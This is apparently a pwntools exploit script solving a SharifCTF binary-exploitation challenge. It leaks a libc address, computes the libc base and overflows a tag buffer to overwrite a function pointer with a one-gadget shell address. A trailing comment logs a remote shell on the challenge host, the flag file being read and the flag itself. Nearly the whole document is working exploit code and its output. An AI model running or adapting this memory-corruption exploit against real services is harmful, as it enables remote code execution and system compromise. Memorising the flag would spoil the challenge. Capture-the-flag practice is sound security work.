from pwn import *

'''
Have you ever played with this *special* seq holder in Python?
nc ctf.sharif.edu 22106
Alternative: nc 213.233.161.38 22106
'''

local = True

if local:
  r = process("./server.py")
else:
  r = remote("213.233.161.38", 22106)

def menu():
	r.recvuntil("Exit")

def create_db(id, tag, l):
	r.sendline("1")
	r.sendline(str(id))
	r.sendline(tag)
	r.sendline(str(l))

def edit_db(tag, seq=None):
	r.sendline("2")
	r.recvuntil("[2] seq")
	r.sendline("1")
	r.sendline(tag)

def print_db(tag=True):
	r.sendline("3")
	r.recvuntil("[2] seq")
	if tag:
		r.sendline("1")
		r.recvuntil("tag: ")
	else:
		r.sendline("2")
		r.recvuntil("seq: ")
		return r.recvuntil("1.")[:-3]


create_db(0, "", 20)
menu()

leak_s = print_db(tag=False)
libc_leak = u64(leak_s.ljust(8, "\x00"))
info("libc_leak: %s" % hex(libc_leak))

libc_offset = 0x7fa3043f7b88-0x00007fa304033000
libc_base = libc_leak - libc_offset
info("libc_base: %s" % hex(libc_base))

menu()

writable_addr = 0x921010
one_shot_shell = libc_base + 0x4526a
edit_db("A"*8 + p64(0)+ p64(0) + p64(writable_addr) + p64(20) + p64(one_shot_shell) + p64(0)) # overflow and overwrite db method
menu()

r.sendline("5")

r.interactive()

'''
[+] Opening connection to 213.233.161.38 on port 22106: Done
[*] libc_leak: 0x7f534050bb88
[*] libc_base: 0x7f5340147000
[*] Switching to interactive mode
Enter selected menu> $ id
uid=1001(suctf) gid=1001(suctf) groups=1001(suctf)
$ cat /home/suctf/flag
SharifCTF{0N3_M0R3_5T3P_70_**J1T**_H34V3N}
'''

